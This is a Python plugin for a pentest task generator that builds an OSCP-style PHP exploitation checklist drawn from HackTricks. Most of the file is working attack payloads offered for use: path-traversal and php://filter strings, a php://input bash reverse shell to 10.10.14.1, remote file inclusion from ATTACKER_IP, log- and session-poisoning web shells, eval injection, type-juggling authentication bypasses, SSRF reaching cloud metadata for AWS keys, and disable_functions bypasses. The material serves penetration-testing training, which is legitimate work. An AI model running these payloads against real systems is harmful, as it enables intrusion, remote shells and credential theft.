"""
PHP Web Application Exploitation Plugin

Generates tasks for PHP application security testing including:
- File inclusion vulnerabilities (LFI/RFI)
- PHP wrappers and protocols exploitation
- PHP-specific code execution techniques
- Type juggling and comparison bypasses
- Session manipulation
- SSRF in PHP functions

Extracted from HackTricks: php-tricks-esp/ and file-inclusion/
Generated by: CrackPot v1.0
OSCP Focus: Practical PHP exploitation techniques for web pentesting
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class PHPPlugin(ServicePlugin):
    """PHP web application exploitation plugin"""

    @property
    def name(self) -> str:
        return "php"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8000, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect PHP-based web applications

        Triggers on:
        - Service banners mentioning PHP
        - Common PHP version strings
        - HTTP services (potential PHP hosting)
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        extrainfo = port_info.get('extrainfo', '').lower()
        port = port_info.get('port')

        # Check for PHP in service details
        php_indicators = ['php', 'apache', 'nginx', 'lighttpd']
        if any(indicator in f"{service} {product} {version} {extrainfo}" for indicator in php_indicators):
            return True

        # Check common web ports (potential PHP hosting)
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate PHP exploitation task tree"""
        version = service_info.get('version', '')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'php-exploit-{port}',
            'name': f'PHP Application Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # 1. PHP Detection & Fingerprinting
        tasks['children'].append({
            'id': f'php-detect-{port}',
            'name': 'PHP Detection & Version Fingerprinting',
            'type': 'parent',
            'children': [
                {
                    'id': f'php-headers-{port}',
                    'name': 'Check PHP Headers',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -I {url}',
                        'description': 'Check HTTP headers for PHP version disclosure',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-I': 'Fetch headers only (HEAD request)',
                            url: 'Target URL to probe'
                        },
                        'success_indicators': [
                            'X-Powered-By: PHP/x.x.x header present',
                            'Server header mentions PHP',
                            'PHPSESSID cookie set'
                        ],
                        'failure_indicators': [
                            'No PHP headers visible (may be hidden)',
                            'Connection refused',
                            'Timeout'
                        ],
                        'next_steps': [
                            'Note PHP version for exploit research',
                            'Check for phpinfo() exposure',
                            'Test for PHP file extensions (.php, .php5, .phtml)'
                        ],
                        'alternatives': [
                            f'Manual: Browser developer tools → Network tab',
                            f'nmap --script http-headers {target} -p {port}',
                            f'whatweb {url} (shows PHP version if exposed)'
                        ],
                        'notes': 'PHP version headers often disabled in production. Look for PHPSESSID cookies as PHP indicator.'
                    }
                },
                {
                    'id': f'phpinfo-search-{port}',
                    'name': 'Search for phpinfo() Disclosure',
                    'type': 'command',
                    'metadata': {
                        'command': f'ffuf -u {url}/FUZZ -w /usr/share/wordlists/wfuzz/general/common.txt -mc 200 -fw 1 -fs 0 -e .php',
                        'description': 'Search for phpinfo() pages (full configuration disclosure)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-u': 'Target URL with FUZZ placeholder',
                            '-w': 'Wordlist for fuzzing',
                            '-mc 200': 'Match HTTP 200 status code',
                            '-fw 1': 'Filter out single-word responses',
                            '-fs 0': 'Filter out zero-size responses',
                            '-e .php': 'Add .php extension to wordlist entries'
                        },
                        'success_indicators': [
                            'phpinfo.php found',
                            'info.php, test.php, or debug.php discovered',
                            'Page displays PHP configuration details'
                        ],
                        'failure_indicators': [
                            'All requests return 404',
                            'WAF blocking requests',
                            'Rate limiting triggered'
                        ],
                        'next_steps': [
                            'Read phpinfo() output: PHP version, loaded modules, disabled functions',
                            'Check allow_url_include (RFI possible if On)',
                            'Check disable_functions for RCE restrictions',
                            'Note session save path for session file inclusion'
                        ],
                        'alternatives': [
                            f'Manual: curl {url}/phpinfo.php, {url}/info.php, {url}/test.php',
                            f'gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php',
                            'Browser: Try common phpinfo paths manually'
                        ],
                        'notes': 'phpinfo() exposes: PHP version, modules, disabled functions, allow_url_include, session paths - critical for RCE chains'
                    }
                }
            ]
        })

        # 2. File Inclusion Testing (LFI/RFI)
        tasks['children'].append({
            'id': f'file-inclusion-{port}',
            'name': 'File Inclusion Vulnerability Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'lfi-common-params-{port}',
                    'name': 'Test Common LFI Parameters',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manually test common parameters vulnerable to Local File Inclusion',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Common LFI-vulnerable parameters (from HackTricks Top 25):
?file=, ?page=, ?include=, ?path=, ?folder=, ?document=, ?view=, ?download=
?cat=, ?dir=, ?action=, ?board=, ?detail=, ?prefix=, ?inc=, ?locate=
?show=, ?doc=, ?site=, ?type=, ?content=, ?layout=, ?mod=, ?conf=

Test payloads:
- Basic: ?file=../../../etc/passwd
- Null byte (PHP < 5.4): ?file=../../../etc/passwd%00
- Double encoding: ?file=..%252f..%252f..%252fetc%252fpasswd
- Path traversal bypass: ?file=....//....//....//etc/passwd
- Filter bypass: ?file=..///////..////..//////etc/passwd

Linux targets: /etc/passwd, /etc/shadow, /var/log/apache2/access.log
Windows targets: C:\\windows\\system32\\drivers\\etc\\hosts, C:\\boot.ini
PHP targets: /var/lib/php/sessions/sess_*, /tmp/sess_*, /var/log/apache2/access.log''',
                        'success_indicators': [
                            'File contents returned (e.g., /etc/passwd users visible)',
                            'Different error than 404 (path exists)',
                            'Log files readable (access.log, error.log)'
                        ],
                        'failure_indicators': [
                            'Same response for all payloads (not vulnerable)',
                            'WAF blocking traversal sequences',
                            'Path sanitization active'
                        ],
                        'next_steps': [
                            'If LFI confirmed: Test for log poisoning (user-agent injection)',
                            'Try session file inclusion (PHPSESSID manipulation)',
                            'Attempt PHP wrapper exploitation (php://filter)',
                            'Check /proc/self/environ for RCE via env variables'
                        ],
                        'alternatives': [
                            f'Automated: wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 0 {url}/page.php?file=FUZZ',
                            f'Automated: ffuf -u {url}/index.php?page=FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt',
                            'Tool: dotdotpwn -m http -h {target} -x {port} -f /etc/passwd'
                        ]
                    }
                },
                {
                    'id': f'php-wrapper-filter-{port}',
                    'name': 'PHP Wrapper: php://filter Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test php://filter wrapper for file read and potential RCE',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''php://filter allows read/write operations with filters:

**Basic file read (base64-encoded to avoid HTML parsing):**
?page=php://filter/convert.base64-encode/resource=index.php
- Decode output: echo "base64string" | base64 -d

**Read /etc/passwd:**
?page=php://filter/convert.base64-encode/resource=/etc/passwd

**Chain filters (ROT13 → base64):**
?page=php://filter/string.rot13|convert.base64-encode/resource=config.php

**Advanced: LFI2RCE via php://filter (PHP < 8.0):**
- Tool: https://github.com/synacktiv/php_filter_chain_generator
- python3 php_filter_chain_generator.py --chain '<?php system($_GET[cmd]); ?>'
- Generates massive filter chain that creates PHP code without writing files
- Payload: ?page=[generated_chain]&cmd=id

**Available filters:**
- String: string.toupper, string.tolower, string.rot13, string.strip_tags
- Convert: convert.base64-encode/decode, convert.quoted-printable-encode/decode
- Convert.iconv: convert.iconv.utf-8.utf-16le (encoding conversions)
- Compression: zlib.deflate, zlib.inflate

**Why this works:**
PHP filters process data BEFORE inclusion. Base64/iconv filters can generate
arbitrary text when chained, allowing code execution without file writes.''',
                        'success_indicators': [
                            'Base64-encoded source code returned',
                            'File contents readable after decode',
                            'RCE via filter chain (command execution works)'
                        ],
                        'failure_indicators': [
                            'php:// wrapper blocked or disabled',
                            'Filter chain too long (length limits)',
                            'allow_url_include=Off (may still work for file://)'
                        ],
                        'next_steps': [
                            'Read sensitive files: config.php, database.php, .env',
                            'Extract credentials from PHP configuration',
                            'Attempt filter chain RCE if LFI confirmed',
                            'Check for file upload + include combination'
                        ],
                        'alternatives': [
                            'Tool: https://github.com/synacktiv/php_filter_chain_generator',
                            'Manual: Craft filter chains with iconv encodings',
                            'Burp Suite: Intruder with filter wordlist'
                        ]
                    }
                },
                {
                    'id': f'php-wrapper-input-{port}',
                    'name': 'PHP Wrapper: php://input RCE',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test php://input wrapper for POST data execution',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''php://input reads raw POST data. If allow_url_include=On, code executes:

**Test payload:**
curl -X POST {url}/index.php?page=php://input --data "<?php system('id'); ?>"

**Reverse shell via php://input:**
curl -X POST {url}/index.php?page=php://input --data "<?php system('bash -c \\'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\\''); ?>"

**File write (if permissions allow):**
curl -X POST {url}/index.php?page=php://input --data "<?php file_put_contents('shell.php', '<?php system($_GET[cmd]); ?>'); ?>"

**Requirements:**
- allow_url_include=On (check phpinfo)
- POST request must contain PHP code
- LFI vulnerability in parameter

**Why this works:**
php://input is a read-only stream for raw POST body. When included,
PHP parses and executes the POST data as PHP code.''',
                        'success_indicators': [
                            'Command output visible in response',
                            'Reverse shell connection received',
                            'Shell file written to disk'
                        ],
                        'failure_indicators': [
                            'allow_url_include=Off (check phpinfo)',
                            'POST data not executed',
                            'WAF blocking php:// protocol'
                        ],
                        'next_steps': [
                            'Establish reverse shell with proper listener',
                            'Upload web shell via file_put_contents',
                            'Enumerate system with RCE',
                            'Attempt privilege escalation'
                        ],
                        'alternatives': [
                            'data:// wrapper: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==',
                            'expect:// wrapper (if expect extension loaded): ?page=expect://id',
                            'phar:// wrapper with malicious phar archive'
                        ]
                    }
                },
                {
                    'id': f'rfi-test-{port}',
                    'name': 'Remote File Inclusion (RFI) Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for RFI if allow_url_include=On',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''RFI requires allow_url_include=On (disabled by default):

**Test RFI (host malicious PHP on attacker server):**
1. Create shell.txt on attacker: <?php system($_GET[cmd]); ?>
2. Start web server: python3 -m http.server 8000
3. Test: {url}/index.php?page=http://ATTACKER_IP:8000/shell.txt&cmd=id

**SMB-based RFI (Windows targets):**
{url}/index.php?page=\\\\ATTACKER_IP\\share\\shell.php

**Data protocol RFI (bypass URL filtering):**
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==&cmd=id
- Base64 payload: <?php system($_GET[cmd]); ?>

**Check allow_url_include:**
- Via phpinfo() page
- Via error messages (some leaks show ini settings)
- Trial and error with RFI tests

**Why often disabled:**
RFI is extremely dangerous. Modern PHP has allow_url_include=Off by default.
LFI is more common in OSCP labs.''',
                        'success_indicators': [
                            'Remote file included and executed',
                            'Web server access log shows request from target',
                            'Command execution successful'
                        ],
                        'failure_indicators': [
                            'allow_url_include=Off (most common)',
                            'Firewall blocking outbound HTTP',
                            'URL scheme filtered'
                        ],
                        'next_steps': [
                            'If RFI works: Upload full webshell',
                            'Establish reverse shell',
                            'If RFI fails: Focus on LFI → RCE techniques'
                        ],
                        'alternatives': [
                            'LFI with log poisoning (inject code in logs)',
                            'LFI with session file poisoning',
                            'php://filter chain for RCE without remote file'
                        ]
                    }
                },
                {
                    'id': f'lfi-log-poison-{port}',
                    'name': 'LFI → RCE via Log Poisoning',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Poison log files with PHP code, then include via LFI',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Log poisoning: Inject PHP code into logs, include log file via LFI

**Apache/Nginx access log poisoning:**
1. Inject PHP in User-Agent: curl -A "<?php system($_GET[cmd]); ?>" {url}
2. Include log: {url}/index.php?page=../../../../var/log/apache2/access.log&cmd=id

**Common log paths:**
Linux Apache: /var/log/apache2/access.log, /var/log/apache2/error.log
Linux Nginx: /var/log/nginx/access.log, /var/log/nginx/error.log
Windows XAMPP: C:\\xampp\\apache\\logs\\access.log
Windows IIS: C:\\inetpub\\logs\\LogFiles\\W3SVC1\\

**SSH log poisoning (if SSH accessible):**
1. Inject PHP in username: ssh '<?php system($_GET[cmd]); ?>'@target
2. Include: ?page=../../../../var/log/auth.log&cmd=id

**Mail log poisoning:**
1. Send email with PHP in subject/body to target
2. Include: ?page=../../../../var/log/mail.log&cmd=id

**Session file poisoning:**
1. Set PHPSESSID cookie with PHP code in session var
2. Include: ?page=../../../../tmp/sess_YOUR_SESSION_ID

**Limitations:**
- Logs must be readable by web user
- Some systems rotate/clear logs frequently
- Large logs may cause memory issues''',
                        'success_indicators': [
                            'Log file readable via LFI',
                            'Injected PHP code visible in log',
                            'Command execution works after inclusion'
                        ],
                        'failure_indicators': [
                            'Log files not readable (permissions)',
                            'PHP code sanitized/escaped in logs',
                            'Log file too large (inclusion fails)'
                        ],
                        'next_steps': [
                            'Establish persistent shell',
                            'Upload web shell via file_put_contents',
                            'Enumerate for privilege escalation'
                        ],
                        'alternatives': [
                            '/proc/self/environ poisoning (inject in HTTP headers)',
                            'Session file poisoning via cookies',
                            'PHP filter chain RCE (no log required)'
                        ]
                    }
                }
            ]
        })

        # 3. PHP Code Execution Techniques
        tasks['children'].append({
            'id': f'php-rce-{port}',
            'name': 'PHP Code Execution Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'php-eval-injection-{port}',
                    'name': 'Test eval() Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for eval() injection vulnerabilities',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''eval() executes strings as PHP code - extremely dangerous if user input reaches it.

**Common vulnerable patterns:**
eval("$variable = $user_input;");
eval("function_name('$user_input');");
assert("some_check('$user_input')");

**Injection payloads (break syntax, inject code, fix syntax):**
'.system('id').'
'.system('id');#
'.system('id');//
'.phpinfo().'

**Example: assert() bypass:**
Original: assert("strpos($_GET['page'],'..') === false")
Payload: ?page=a','NeVeR') === false and system('id') and strpos('a

**Command execution via eval:**
'.system('whoami').'
'.exec('cat /etc/passwd').'
'.shell_exec('ls -la').'
'.passthru('id').'

**Why this works:**
Single/double quotes break out of string context. Logic operators (and/or)
chain commands. Comments (#, //) ignore trailing code.''',
                        'success_indicators': [
                            'Command output visible',
                            'phpinfo() displayed',
                            'Syntax error reveals vulnerable eval() context'
                        ],
                        'failure_indicators': [
                            'Input sanitized/escaped',
                            'eval() not used',
                            'Syntax breaks cause fatal error'
                        ],
                        'next_steps': [
                            'Establish reverse shell',
                            'Read sensitive files',
                            'Enumerate for privilege escalation'
                        ],
                        'alternatives': [
                            'preg_replace /e modifier (deprecated PHP < 5.5)',
                            'create_function() injection',
                            'Variable variables: ${${system(id)}}'
                        ]
                    }
                },
                {
                    'id': f'php-preg-replace-{port}',
                    'name': 'Test preg_replace() /e Modifier RCE',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit deprecated preg_replace /e modifier (PHP < 5.5)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''preg_replace() with /e modifier executes replacement as PHP code:

**Vulnerable code:**
preg_replace("/<tag>(.*)<\\/tag>/e", "strtoupper('\\\\1')", $input);

**Exploitation:**
Input: <tag>{${phpinfo()}}</tag>
Input: <tag>{${system($_GET[cmd])}}</tag>

**Why deprecated:**
/e modifier treats replacement as PHP code eval. Removed in PHP 5.5+.
Only works on old PHP versions (check version first).

**Requires:**
- PHP < 5.5.0
- User input reaches preg_replace replacement parameter
- /e modifier present in pattern''',
                        'success_indicators': [
                            'Code executed in replacement context',
                            'phpinfo() or command output visible'
                        ],
                        'failure_indicators': [
                            'PHP >= 5.5 (/e removed)',
                            'Replacement parameter not controllable'
                        ],
                        'next_steps': [
                            'Confirm PHP version < 5.5',
                            'Test command execution',
                            'Upload web shell'
                        ],
                        'alternatives': [
                            'eval() injection',
                            'assert() injection',
                            'create_function() injection'
                        ]
                    }
                },
                {
                    'id': f'php-deserialization-{port}',
                    'name': 'PHP Object Injection / Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for PHP unserialize() vulnerabilities',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''PHP unserialize() can execute code via magic methods (__destruct, __wakeup, etc.)

**Vulnerable pattern:**
unserialize($_COOKIE['data']);
unserialize($_GET['data']);

**Basic test (detect unserialize):**
O:8:"stdClass":0:{}
- If accepted: vulnerable to object injection

**Exploitation requires:**
1. unserialize() called on user input
2. Existing class with exploitable magic method
3. Property injection to trigger code path

**Common magic methods:**
__destruct() - called when object destroyed
__wakeup() - called on unserialize()
__toString() - called when object used as string

**Tools:**
- phpggc: Library of PHP gadget chains for popular frameworks
  git clone https://github.com/ambionics/phpggc
  php phpggc -l (list gadgets)
  php phpggc Laravel/RCE1 system id (generate payload)

**Example payload (simple RCE class):**
O:9:"EvilClass":1:{s:4:"cmd";s:2:"id";}

**Why dangerous:**
Gadget chains in frameworks (Laravel, Symfony, Doctrine) allow RCE
without custom vulnerable classes.''',
                        'success_indicators': [
                            'Object injection successful',
                            'Magic method triggered',
                            'RCE via gadget chain'
                        ],
                        'failure_indicators': [
                            'unserialize() not used',
                            'No exploitable classes available',
                            'Input validation blocks serialized objects'
                        ],
                        'next_steps': [
                            'Identify PHP framework (Laravel, Symfony, etc.)',
                            'Use phpggc to generate gadget chain',
                            'Achieve RCE and establish shell'
                        ],
                        'alternatives': [
                            'phar:// deserialization (upload .phar file)',
                            'Session deserialization exploitation'
                        ]
                    }
                }
            ]
        })

        # 4. PHP Bypass Techniques
        tasks['children'].append({
            'id': f'php-bypass-{port}',
            'name': 'PHP Security Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'php-type-juggling-{port}',
                    'name': 'Type Juggling Attacks',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit PHP loose comparison (==) vulnerabilities',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''PHP == does type coercion. Use === for strict comparison.

**Magic hash bypass (password check):**
If: if ($hash == "0") - TRUE when hash starts with "0e" + digits
Hashes starting with "0e": 0e215962017, 0e730083352809587323
Input: QNKCDZO (MD5: 0e830400451993494058024219903391)

**String to int comparison:**
"admin" == 0  → TRUE (non-numeric string = 0)
"5users" == 5 → TRUE (string starts with number)
"0xABCD" == "43981" → TRUE (hex string comparison)

**strcmp() bypass:**
strcmp("password", []) returns NULL
if (!strcmp($input, $password)) - TRUE with array input
Exploit: ?password[]=

**in_array() bypass:**
in_array(0, ["admin","user"]) → TRUE (type juggling)
Use in_array($val, $array, true) for strict check

**preg_match() newline bypass:**
preg_match("/^[a-z]+$/", $input) only checks FIRST line
Input: aaaa\\n<?php system('id'); ?> (newline = %0A)

**JSON injection for newline:**
{"cmd": "cat /etc/passwd"}  (multi-line bypasses preg_match ^.*$)

**Why this works:**
PHP's loose comparison converts types automatically, leading to
unexpected TRUE comparisons.''',
                        'success_indicators': [
                            'Authentication bypassed',
                            'Magic hash collision successful',
                            'strcmp() returns NULL, bypass succeeds'
                        ],
                        'failure_indicators': [
                            'Strict comparison (===) used',
                            'Type checking before comparison',
                            'Array input blocked'
                        ],
                        'next_steps': [
                            'Escalate access with bypassed authentication',
                            'Test other weak comparisons in application',
                            'Document for OSCP report'
                        ],
                        'alternatives': [
                            'SQL injection if database auth',
                            'Session fixation/hijacking'
                        ]
                    }
                },
                {
                    'id': f'php-disable-functions-{port}',
                    'name': 'Bypass disable_functions Restrictions',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass disable_functions to achieve RCE',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'notes': '''disable_functions blocks dangerous functions like system(), exec(), shell_exec()

**Check disabled functions:**
Via phpinfo() → disable_functions directive
Via: echo ini_get('disable_functions');

**Bypass techniques:**

1. **LD_PRELOAD exploit (Linux):**
   - Upload malicious .so library
   - Set LD_PRELOAD env variable
   - Trigger function that loads library
   - Tool: https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

2. **PHP 7.0-7.4 FFI bypass:**
   - Use FFI extension to call C functions
   - Requires: extension=ffi enabled
   - Payload: FFI::cdef("int system(const char *command);")

3. **mail() function bypass:**
   - If mail() not disabled, inject via -X parameter
   - Write log file with PHP code

4. **Alternative functions:**
   - pcntl_exec() - If pcntl extension loaded
   - proc_open() - Process control
   - popen() - Pipe to process
   - dl() - Load PHP extension

5. **Imagick exploit (CVE-2016-3714):**
   - If imagick extension loaded
   - ImageMagick command injection

6. **PHP-FPM/FastCGI bypass:**
   - Direct communication with FPM socket
   - Requires socket access

**Why difficult:**
Modern PHP hardening disables most RCE functions. OSCP focuses on
simpler RCE paths. This is advanced/rare in exam.''',
                        'success_indicators': [
                            'RCE achieved despite disable_functions',
                            'Alternative function works',
                            'LD_PRELOAD exploit successful'
                        ],
                        'failure_indicators': [
                            'All RCE functions blocked',
                            'No alternative methods available',
                            'Extensions not loaded'
                        ],
                        'next_steps': [
                            'If bypass works: Establish shell',
                            'If blocked: Focus on data exfiltration',
                            'Check for other vulnerabilities (SQLi, SSRF)'
                        ],
                        'alternatives': [
                            'File write + cron job execution',
                            'SSRF to internal services',
                            'Database write to web directory'
                        ]
                    }
                },
                {
                    'id': f'php-session-manipulation-{port}',
                    'name': 'PHP Session File Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit PHP session handling for privilege escalation',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''PHP sessions stored in files, typically /var/lib/php/sessions/ or /tmp/

**Session file format:**
Filename: sess_<PHPSESSID>
Content: username|s:5:"admin";isAdmin|b:1;

**Attack 1: Session file inclusion**
1. Set PHPSESSID cookie
2. Inject PHP code in session variable
3. Include session file via LFI
Example: ?page=../../../../tmp/sess_YOURPHPSESSID

**Attack 2: Session fixation**
1. Create session with known ID
2. Set malicious session data
3. Force victim to use your session ID
4. Access application with victim's privileges

**Attack 3: Session deserialization**
1. If unserialize() used on session data
2. Inject serialized object in session
3. Trigger object injection RCE

**Common session paths:**
/var/lib/php/sessions/sess_*
/var/lib/php5/sess_*
/tmp/sess_*
/tmp/php_sessions/sess_*

**Session cookie locations:**
Cookie: PHPSESSID=<value>
Cookie: phpMyAdmin=<value>

**Why this works:**
Session files are predictable, often readable by web user, and
contain serialized user-controlled data.''',
                        'success_indicators': [
                            'Session file readable via LFI',
                            'PHP code in session executes',
                            'Session fixation successful'
                        ],
                        'failure_indicators': [
                            'Session files not readable',
                            'Session path unknown',
                            'Custom session handler (not file-based)'
                        ],
                        'next_steps': [
                            'Escalate privileges via session manipulation',
                            'Achieve RCE via session file inclusion',
                            'Hijack admin sessions'
                        ],
                        'alternatives': [
                            'Cookie manipulation for privilege escalation',
                            'JWT token manipulation if used'
                        ]
                    }
                }
            ]
        })

        # 5. PHP SSRF Exploitation
        tasks['children'].append({
            'id': f'php-ssrf-{port}',
            'name': 'PHP SSRF Vulnerability Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test PHP functions for Server-Side Request Forgery',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'notes': '''PHP functions that can cause SSRF:

**Vulnerable functions:**
file_get_contents() - Most common
curl_exec() / curl_init()
fopen() / readfile()
fsockopen() / pfsockopen()
file() / file_put_contents()
simplexml_load_file()
DOMDocument::load()

**Test payloads:**
http://localhost/ (internal services)
http://127.0.0.1:8080/ (non-standard ports)
http://169.254.169.254/latest/meta-data/ (AWS metadata)
http://metadata.google.internal/ (GCP metadata)
file:///etc/passwd (file:// protocol)
gopher://localhost:3306/ (protocol smuggling)

**SSRF → RCE chains:**
1. Redis exploitation: gopher://localhost:6379/_...
2. Memcached: gopher://localhost:11211/_...
3. Internal API abuse
4. Cloud metadata extraction (AWS keys)

**Bypass filters:**
- Use @ in URL: http://evil.com@localhost/
- Use redirect: http://attacker.com/redirect_to_localhost
- DNS rebinding: Point domain to 127.0.0.1
- IPv6: http://[::1]/ instead of localhost
- Decimal IP: http://2130706433/ (127.0.0.1 in decimal)

**Why dangerous:**
SSRF accesses internal services not exposed externally. Can lead to
AWS key theft, internal service exploitation, or port scanning.''',
                'success_indicators': [
                    'Internal service response visible',
                    'Cloud metadata accessible',
                    'File:// protocol works',
                    'Different response for valid internal IPs'
                ],
                'failure_indicators': [
                    'URL validation blocks internal IPs',
                    'Protocol whitelist (http/https only)',
                    'Network segmentation prevents access'
                ],
                'next_steps': [
                    'Map internal network via SSRF',
                    'Extract cloud credentials if in AWS/GCP/Azure',
                    'Exploit internal services (Redis, Memcached)',
                    'Chain with other vulnerabilities'
                ],
                'alternatives': [
                    'XXE for SSRF (if XML parsing exists)',
                    'SSRF via image processing (ImageMagick)',
                    'SSRF via PDF generation (wkhtmltopdf)'
                ]
            }
        })

        # 6. PHP Environment Exploitation
        tasks['children'].append({
            'id': f'php-env-exploit-{port}',
            'name': 'PHP Environment Variable Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit PHP environment variable handling for RCE',
                'tags': ['OSCP:LOW', 'MANUAL'],
                'notes': '''Environment variables in PHP can be leveraged for RCE in specific scenarios:

**LD_PRELOAD exploitation:**
1. Upload malicious .so shared library
2. Set LD_PRELOAD to library path
3. Trigger function that spawns process
4. Malicious library loaded, code executes

**PHPRC exploitation (CVE-2023-36844 variant):**
1. Upload php.ini with: auto_prepend_file="/path/to/shell.php"
2. Set PHPRC environment variable to php.ini path
3. Any PHP execution prepends shell

**PHPRC + auto_prepend_file (no upload):**
If stdin controllable: PHPRC=/dev/fd/0 with body:
auto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+"

**register_argc_argv exploitation:**
If register_argc_argv=On, URL params parsed as CLI args:
?--define+auto_prepend_file=/tmp/shell.txt

**putenv() abuse:**
If putenv() callable with user input:
putenv("LD_PRELOAD=/tmp/evil.so")

**Why rare in OSCP:**
Requires specific PHP configurations or vulnerabilities. More common
in CTFs than real OSCP exam. Focus on simpler RCE paths first.''',
                'success_indicators': [
                    'Environment variable set successfully',
                    'Malicious library loaded',
                    'RCE achieved via env manipulation'
                ],
                'failure_indicators': [
                    'putenv() disabled',
                    'Insufficient privileges to set env vars',
                    'File upload not possible'
                ],
                'next_steps': [
                    'Establish persistent access',
                    'Document technique for report',
                    'Check for simpler RCE methods first'
                ],
                'alternatives': [
                    'LFI → RCE via log poisoning',
                    'File upload → direct web shell',
                    'SQL injection → xp_cmdshell (MSSQL)'
                ]
            }
        })

        # 7. PHP-Specific Exploit Research
        if version:
            tasks['children'].append({
                'id': f'php-version-exploits-{port}',
                'name': f'PHP Version Exploits: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-php-{port}',
                        'name': f'SearchSploit: PHP {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit php {version}',
                            'description': 'Search for known PHP version exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'php': 'Search term: PHP',
                                version: f'Search term: version {version}'
                            },
                            'success_indicators': [
                                'Exploits found in ExploitDB',
                                'CVE numbers identified',
                                'Metasploit modules available'
                            ],
                            'next_steps': [
                                'Review exploit requirements',
                                'Test applicable exploits',
                                'Check for public PoCs on GitHub'
                            ],
                            'alternatives': [
                                f'Google: "PHP {version} exploit"',
                                f'Check: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html',
                                'Metasploit: search php'
                            ]
                        }
                    },
                    {
                        'id': f'php-cve-lookup-{port}',
                        'name': 'PHP CVE Database Search',
                        'type': 'command',
                        'metadata': {
                            'command': f'crack cve-lookup PHP {version}',
                            'description': 'Search CVE databases for PHP vulnerabilities',
                            'tags': ['RESEARCH'],
                            'notes': 'Focus on RCE, authentication bypass, and file handling CVEs'
                        }
                    }
                ]
            })

        return tasks
